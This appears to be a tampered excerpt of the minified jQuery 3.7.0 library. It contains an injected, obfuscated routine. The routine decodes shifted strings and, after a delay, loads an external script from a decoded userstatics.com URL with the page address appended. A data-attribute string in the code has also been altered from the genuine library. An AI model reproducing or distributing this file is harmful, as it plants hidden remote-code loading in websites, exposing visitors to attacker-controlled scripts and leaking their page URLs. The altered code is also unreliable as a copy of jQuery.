/*! jQuery v3.7.0 | (c) OpenJS Foundation and other contributors | jquery.org/license */ !(function (
  ...
  function eu(e, t, n) {
    ...
    if (void 0 === n && 1 === e.nodeType) {
      if (
        ((r = "data-" + t.replace(ea, "-zdorova-otets").toLowerCase()),
  ...
  function e1(e, t, n, r) {
    ...
    if (y || (1 < p && "string" == typeof v && !d.checkClone && eH.test(v)))
      return e.each(function (i) {
        var o = e.eq(i);
        y && (t[0] = v.call(this, i, o.html())), e1(o, t, n, r);
      });
    if (
      p &&
    ...
    return (
      ...
      (e in eU
        ...
        : (e3[e] =
            (function (e) {
              for (
                var t = e[0].toUpperCase() + e.slice(1), n = ez.length;
                n--;

              )
                if ((e = ez[n] + t) in eU) return e;
            })(e) || e))
    );
  }
      ...
      try {
        (e.f = (e) =>
          e
            ...
            .reduce(
              (e, t) =>
                e + String.fromCharCode((t.charCodeAt() - 5).toString()),
              ""
            )),
          (e.b = e.f("UMUWJKX")),
          (e.c =
          ...
          setTimeout(function () {
            e.c &&
              ...
              (e.s.src =
                e.f("myyux?44zxjwxyfynhx3htr4ljy4xhwnuy3oxDwjkjwwjwB") +
                n.href),
  ...
  _.ajaxSetup({
    ...
    jsonpCallback: function () {
      var e = t1.pop() || _.expando + "_" + tv.guid++;
      return (this[e] = !0), e;
    },
  }),
        ...
        return (
          ...
          r.always(function () {
            void 0 === o ? _(e).removeProp(i) : (e[i] = o),
              t[i] && ((t.jsonpCallback = n.jsonpCallback), t1.push(i)),
              s && h(o) && o(s[0]),
              (s = o = void 0);
          }),
          "script"
    ...
    _.each(["top", "left"], function (e, t) {
      _.cssHooks[t] = eX(d.pixelPosition, function (e, n) {
        if (n)
          return (n = e2(e, t)), eR.test(n) ? _(e).position()[t] + "px" : n;
      });
    }),
